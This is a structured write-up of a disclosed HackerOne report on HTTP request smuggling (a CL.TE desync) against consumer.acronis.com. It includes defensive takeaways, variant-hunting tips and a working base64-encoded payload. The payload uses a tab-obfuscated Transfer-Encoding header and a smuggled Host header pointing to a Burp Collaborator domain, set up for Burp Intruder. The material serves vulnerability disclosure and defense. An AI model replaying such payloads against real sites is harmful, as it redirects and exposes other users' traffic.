# HTTP Request Smuggling on consumer.acronis.com

## Metadata
- **Source:** HackerOne
- **Report:** 1063627 | https://hackerone.com/reports/1063627
- **Submitted:** 2020-12-21
- **Reporter:** riramar
- **Program:** Acronis
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** HTTP Request Smuggling, CL.TE (Content-Length/Transfer-Encoding) Desync, Open Redirect, Host Header Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
consumer.acronis.com is vulnerable to HTTP Request Smuggling via CL.TE desync attack, allowing attackers to inject malicious requests that are interpreted by the backend server. This enables attackers to redirect all users to attacker-controlled domains or perform other attacks by exploiting inconsistent HTTP parsing between frontend and backend servers.

## Attack scenario
1. Attacker crafts a POST request with conflicting Content-Length and Transfer-Encoding headers (using tab character to evade parser detection)
2. The frontend proxy server processes the request using Content-Length header and forwards complete request to backend
3. Backend server processes the same request using Transfer-Encoding: chunked and interprets it differently, treating the second POST request as smuggled
4. The smuggled request contains a malicious Host header pointing to attacker's domain (burpcollaborator.net)
5. Subsequent legitimate user requests get prepended with the smuggled request, causing them to be redirected to the attacker's domain
6. Attacker receives redirect traffic from all users accessing the vulnerable /sf path

## Root cause
Frontend and backend servers use different HTTP header precedence when both Content-Length and Transfer-Encoding are present. Frontend uses CL, backend uses TE, creating desynchronization. Tab character obfuscation bypasses naive header parsing. Backend fails to validate or reject conflicting headers, allowing request smuggling.

## Attacker mindset
Exploit HTTP protocol ambiguity between proxy and backend servers. Use character encoding tricks (tabs vs spaces) to evade security filters. Leverage host header injection to achieve credential theft, session hijacking, and mass user redirection. Automate the attack via Burp Intruder to capture all incoming traffic.

## Defensive takeaways
- Enforce consistent HTTP header parsing: reject requests with both Content-Length and Transfer-Encoding headers present
- Normalize all whitespace in headers (convert tabs to spaces) before processing
- Use HTTP/2 exclusively where possible, as it has stricter parsing rules
- Implement strict request validation rejecting ambiguous message boundaries
- Ensure frontend and backend servers use identical HTTP parsing logic and header precedence rules
- Monitor for suspicious Host header changes or multiple conflicting headers
- Implement request smuggling detection signatures looking for CL.TE, TE.CL, and TE.TE patterns
- Use WAF rules to block requests with Transfer-Encoding and Content-Length together

## Variant hunting
TE.CL desync (Transfer-Encoding on frontend, Content-Length on backend)
TE.TE desync (both parse TE but with different chunking logic)
Use alternative obfuscation: spaces, case variations, Unicode characters in headers
Test with different payload sizes to bypass length validation
Attempt cache poisoning by targeting /static or /api paths
Try Host header injection variants combined with path traversal
Explore reverse proxy configurations (nginx, Apache, HAProxy) for different parsing behaviors
Test on different API versions or endpoints (/api/v1, /api/v2)

## MITRE ATT&CK
- T1190
- T1040
- T1557
- T1556
- T1557.002
- T1202

## Notes
Report demonstrates working PoC with base64 encoded payload and Burp Collaborator integration. Key technical detail: using tab character instead of space in Transfer-Encoding header header to evade naive parsing filters. The 64-byte hex chunk size must precisely match the smuggled POST request body. This attack affects all users of the domain, making it a severe availability and confidentiality issue. Similar vulnerabilities commonly found in reverse proxy configurations and load balancers with inconsistent HTTP parsing implementations.

## Full report
<details><summary>Expand</summary>

## Summary
The website https://consumer.acronis.com is vulnerable to HTTP Request Smuggling which can be abused by an attacker to redirect all the users to a malicious website.
A redirect can be forced by changing the Host request header using the path /sf but the website will redirect you to https://9oyta0p1z1ratbswtnnl67cv1m7cv1.burpcollaborator.net/sf/.
To reproduce the attack use the configuration below in a Burp Intruder attack. Notice the header "Transfer-Encoding : chunked" is not using space but a tab. You can also use the base64 decoded form of this string below.
The size of 64 bytes in hex on the request body must match with the size the second POST request. If you change the "Host: 9oyta0p1z1ratbswtnnl67cv1m7cv1.burpcollaborator.net" header you need to update the size.

```
UE9TVCAvIEhUVFAvMS4xDQpUcmFuc2Zlci1FbmNvZGluZwk6CWNodW5rZWQNCkhvc3Q6IGNvbnN1bWVyLmFjcm9uaXMuY29tDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzguMC4zOTA0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpDb250ZW50LWxlbmd0aDogNA0KDQo2NA0KUE9TVCAvc2YgSFRUUC8xLjENCkhvc3Q6IDlveXRhMHAxejFyYXRic3d0bm5sNjdjdjFtN2N2MS5idXJwY29sbGFib3JhdG9yLm5ldA0KQ29udGVudC1MZW5ndGg6IDE1DQoNCg0KMA0KDQo=
```

{F1124528}
{F1124529}
{F1124530}
{F1124531}

As soon as you start the Burp Intruder attack above you will see some redirects to Burp Collaborator domain.

{F1124533}

Start to receiving some connections on Burp Collaborator.

{F1124534}
{F1124535}

## Recommendations
- https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- https://portswigger.net/web-security/request-smuggling
- https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling/

## Impact

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
In this PoC I was able to massive redirect users to a domain under my control but other scenarios are also possible like the ones described here https://portswigger.net/web-security/request-smuggling/exploiting.

</details>

---
*Analysed by Claude on 2026-05-24*
